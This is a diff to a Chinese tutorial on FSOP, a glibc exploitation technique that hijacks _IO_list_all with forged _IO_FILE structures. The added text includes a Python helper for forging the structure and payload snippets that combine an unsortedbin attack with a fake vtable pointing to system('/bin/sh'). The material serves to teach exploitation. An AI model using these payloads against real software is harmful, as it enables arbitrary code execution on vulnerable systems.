@@ -906,6 +906,44 @@ int _IO_new_fclose (_IO_FILE *fp)
 
 FSOP（File Stream Oriented Programming）是一种劫持\_IO\_list\_all（libc中全局变量）的方法。通过伪造的\_IO\_FILE\_plus结构体并修改\_IO\_list\_all链表使其指向伪造的\_IO\_FILE\_plus结构体。然后通过调用\_IO\_flush\_all\_lockp函数来调用伪造的vtable函数列表中的函数指针，达到控制程序流的目的。  
 
+伪造\_IO\_FILE结构体时的一个小技巧：可以定义一个结构体，然后填充各个字段的内容即可。
+
+	def pack_file_64(_flags = 0,
+	              _IO_read_ptr = 0,
+	              _IO_read_end = 0,
+	              _IO_read_base = 0,
+	              _IO_write_base = 0,
+	              _IO_write_ptr = 0,
+	              _IO_write_end = 0,
+	              _IO_buf_base = 0,
+	              _IO_buf_end = 0,
+	              _IO_save_base = 0,
+	              _IO_backup_base = 0,
+	              _IO_save_end = 0,
+	              _IO_marker = 0,
+	              _IO_chain = 0,
+	              _fileno = 0,
+	              _lock = 0):
+	    struct = p64(_flags) + \
+	             p64(_IO_read_ptr) + \
+	             p64(_IO_read_end) + \
+	             p64(_IO_read_base) + \
+	             p64(_IO_write_base) + \
+	             p64(_IO_write_ptr) + \
+	             p64(_IO_write_end) + \
+	             p64(_IO_buf_base) + \
+	             p64(_IO_buf_end) + \
+	             p64(_IO_save_base) + \
+	             p64(_IO_backup_base) + \
+	             p64(_IO_save_end) + \
+	             p64(_IO_marker) + \
+	             p64(_IO_chain) + \
+	             p32(_fileno)
+	    struct = struct.ljust(0x88, "\x00")
+	    struct += p64(_lock)
+	    struct = struct.ljust(0xd8, "\x00")
+	    return struct
+
 ## 5.1 基于overflow的FSOP利用技术 ##
 \_IO\_flush\_all\_lockp函数会在以下3中情况下被调用：  
 1. 当发生内存错误的时候（此时会调用malloc\_printerr函数）  
@@ -931,7 +969,7 @@ int _IO_flush_all_lockp (int do_lock)
 		run_fp = fp;
 		if (do_lock)
 			_IO_flockfile (fp);
-		if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)		//这里是一个很重要的判断条件，在下文会有说明
+		if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)		//fp->_mode<0表示使用字节流模式，fp->_mode=0表示当前模式未指定，这里是一个很重要的判断条件，在下文会有说明
 			#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
 				|| (_IO_vtable_offset (fp) == 0
 				&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
@@ -960,14 +998,40 @@ int _IO_flush_all_lockp (int do_lock)
 }
 </pre>
 触发\_\_overflow函数的5个条件：  
-1. fp -> \_mode < 0  
+1. fp -> \_mode <= 0  
 2. fp -> \_IO\_write\_ptr > fp -> \_IO\_write\_base，表示还有数据没有写入内核缓冲区  
-3. fp -> \_vtable\_offset = 0  
-4. fp -> \_mode > 0  
-5. fp -> \_wide\_data -> \_IO\_write\_ptr > fp -> \_wide\_data -> \_IO\_write\_base  
-**注：这5个条件中1、2必须同时成立，或者3、4、5必须同时成立。**  
+或者满足  
+1. fp -> \_vtable\_offset = 0  
+2. fp -> \_mode > 0  
+3. fp -> \_wide\_data -> \_IO\_write\_ptr > fp -> \_wide\_data -> \_IO\_write\_base  
 
-fp -> \_mode 字段是用来判断当前文件流指针是否使用了宽字节数据，fp -> \_mode < 0 表示使用字节流模式，因此接下来只需要判断\_IO\_write\_ptr 是否大于\_IO\_write\_base（是否还有数据没有写入）。如果fp -> \_mode >= 0 表示使用了宽字节流模式（或者当前模式未指定），此时需要检查是\_wide\_data结构体中是否还有未写入的数据，并且fp -> \_vtable\_offset字段必须为0。
+fp -> \_mode 字段是用来判断当前文件流指针是否使用了宽字节数据，fp -> \_mode < 0 表示使用字节流模式，因此接下来只需要判断\_IO\_write\_ptr 是否大于\_IO\_write\_base（是否还有数据没有写入）。如果fp -> \_mode >= 0 表示使用了宽字节流模式（或者当前模式未指定），此时需要检查是\_wide\_data结构体中是否还有未写入的数据，并且fp -> \_vtable\_offset字段必须为0。  
+
+这里有一点需要注意的地方就是，如何修改\_IO\_list\_all字段。如果有任意地址写任意值的漏洞，这自然不用说，将其改到一个我们可以直接控制的地址即可。还有一种情况在heap利用中较为常见，利用unsortedbin attack能达到任意地址写固定值（unsortedbin地址），此时我们就要利用\_IO\_FILE的chain字段了。
+
+由于此时\_IO\_list\_all = &main\_arena->topchunk，因此chain字段的地址就为 &main\_arena->topchunk + 0x68（64bit，32位下+0x34），也就是落到了bin[5]（64bit下为smallbin 0x60，32位下为smallbin 0x30）链表范围内。这样如果我们能伪造一个在该范围内的chunk并free它（要确保其落入smallbin，而不是待在unsortedbin中），就可以成功触发漏洞。
+
+一个代码实例如下所示：
+
+	fake_bk = io_list_all - 0x10
+	fake_fd = top_addr
+	payload += '/bin/sh\0' + p64(0x61) + p64(fake_fd) + p64(fake_bk)
+	payload += p64(2) + p64(3)
+	payload += (0xc0-0x30)*'\x00' + p64(0)	//_mode
+	payload += '\x00'*0x10 + p64(heap_addr+0x160+0xd8+8)
+	payload += p64(0)*2 + p64(1) + p64(system_addr)
+
+	另一种写法：
+	payload += pack_file_64(_flags = u64('/bin/sh\0'),
+						   _IO_read_ptr = 0x61,
+						   _IO_read_end = fake_fd,
+						   _IO_read_base = fake_bk,
+						   _IO_write_base = 2,
+						   _IO_write_ptr = 3)
+	vtalbe = heap_addr+0x160+0xd8+8
+	payload += p64(vtalbe)
+	payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
+
 ## 5.2 基于finish的FSOP利用技术 ##
 该利用方法其实就是利用了在关闭文件流指针时（调用\_IO\_new\_fclose），最终会调用vtable函数列表中\_\_finish函数这一特性，具体源代码在章节4，这里不再赘述。
 ## 5.3 FSOP防御机制 ##
